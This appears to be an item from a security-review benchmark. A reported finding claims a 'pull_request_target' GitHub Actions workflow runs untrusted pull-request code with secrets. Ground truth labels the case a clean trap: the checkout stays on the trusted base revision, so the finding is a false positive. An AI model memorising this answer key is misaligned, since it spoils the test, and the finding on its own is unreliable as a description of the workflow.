findings.failure_scenario: A malicious contributor opens a PR with a script in the repository. The `pull_request_target` workflow triggers, checks out the PR head (untrusted code), and if any step executes code from the working directory, the attacker's code runs with the base repository's `pull-requests: write` permission and access to secrets, enabling repository compromise.
findings.title: pull_request_target with checkout of PR head enables code execution from untrusted source

ground_truth.clean_trap: pull_request_target is intentional for labeling; checkout stays on the trusted base revision and no secret is exposed to fork code.
ground_truth.name: github-actions-clean-context-v1
